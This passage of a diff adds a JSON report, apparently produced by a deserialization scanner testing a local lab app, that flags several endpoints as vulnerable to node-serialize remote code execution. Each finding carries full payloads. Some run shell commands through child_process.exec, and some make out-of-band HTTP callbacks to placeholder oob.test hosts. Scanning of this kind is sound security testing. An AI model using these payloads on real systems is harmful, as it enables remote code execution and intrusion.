+                        "body_sample": "{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":null,\"hooks\":1,\"output\":[\"[object Object]\"]}}"
+                    }
+                }
+            ],
+            "oob_confirmed": true
+        },
+        {
+            "url": "http://localhost:8088/api/export-prefs",
+            "method": "GET",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "f1984f3346df",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function () { return this.username; }"
+            ],
+            "mutations_count": 4,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function () { return 1; }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function () { return 1; }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function () { return 1; }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function () { return 1; }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function () { return 1; }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function () { return 1; }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://f1984f3346df.oob.test/').on('error',function(){});}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function () { return 1; }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 78,
+                        "body_sample": "{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function () { return 1; }\"}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8088/api/export-yaml",
+            "method": "GET",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "33b4bf4f9b54",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function () { return this.username; }"
+            ],
+            "mutations_count": 4,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 100,
+                        "body_sample": "name: default\nonLoad: !<tag:yaml.org,2002:js/function> 'function () { return true; }'\nenabled: true\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 100,
+                        "body_sample": "name: default\nonLoad: !<tag:yaml.org,2002:js/function> 'function () { return true; }'\nenabled: true\n"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 100,
+                        "body_sample": "name: default\nonLoad: !<tag:yaml.org,2002:js/function> 'function () { return true; }'\nenabled: true\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 100,
+                        "body_sample": "name: default\nonLoad: !<tag:yaml.org,2002:js/function> 'function () { return true; }'\nenabled: true\n"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 100,
+                        "body_sample": "name: default\nonLoad: !<tag:yaml.org,2002:js/function> 'function () { return true; }'\nenabled: true\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 100,
+                        "body_sample": "name: default\nonLoad: !<tag:yaml.org,2002:js/function> 'function () { return true; }'\nenabled: true\n"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://33b4bf4f9b54.oob.test/').on('error',function(){});}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 100,
+                        "body_sample": "name: default\nonLoad: !<tag:yaml.org,2002:js/function> 'function () { return true; }'\nenabled: true\n"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 100,
+                        "body_sample": "name: default\nonLoad: !<tag:yaml.org,2002:js/function> 'function () { return true; }'\nenabled: true\n"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8088/api/import-config",
+            "method": "POST",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "c009e1e9e899",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function () { return this.username; }"
+            ],
+            "mutations_count": 4,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 104,
+                        "body_sample": "{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":null,\"polluted\":null}}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 104,
+                        "body_sample": "{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":null,\"polluted\":null}}}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 104,
+                        "body_sample": "{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":null,\"polluted\":null}}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 104,
+                        "body_sample": "{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":null,\"polluted\":null}}}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 104,
+                        "body_sample": "{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":null,\"polluted\":null}}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 104,
+                        "body_sample": "{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":null,\"polluted\":null}}}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://c009e1e9e899.oob.test/').on('error',function(){});}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 104,
+                        "body_sample": "{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":null,\"polluted\":null}}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 104,
+                        "body_sample": "{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":null,\"polluted\":null}}}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8088/api/import",
+            "method": "POST",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "c017f94b777a",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function () { return this.username; }"
+            ],
+            "mutations_count": 4,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://c017f94b777a.oob.test/').on('error',function(){});}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8088/api/restore-prefs",
+            "method": "POST",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "2bbbbefc98c1",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function () { return this.username; }"
+            ],
+            "mutations_count": 4,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://2bbbbefc98c1.oob.test/').on('error',function(){});}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 91,
+                        "body_sample": "{\"success\":true,\"restored\":\"{ theme: 'dark', lang: 'en', render: [Function (anonymous)] }\"}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8088/api/import-async",
+            "method": "POST",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "8a051237930a",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function () { return this.username; }"
+            ],
+            "mutations_count": 4,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://8a051237930a.oob.test/').on('error',function(){});}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8088/api/import-yaml",
+            "method": "POST",
+            "location": "cookie",
+            "name": "session",
+            "occurrences": 1,
+            "oob_token": "809563dacc0a",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function () { return this.username; }"
+            ],
+            "mutations_count": 4,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 72,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 72,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 72,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 72,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 72,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 72,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://809563dacc0a.oob.test/').on('error',function(){});}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 72,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 72,
+                        "body_sample": "{\"success\":true,\"config\":{\"name\":\"default\",\"hooks\":1,\"output\":[\"true\"]}}"
+                    }
+                }
+            ]
+        }
+    ]
+}
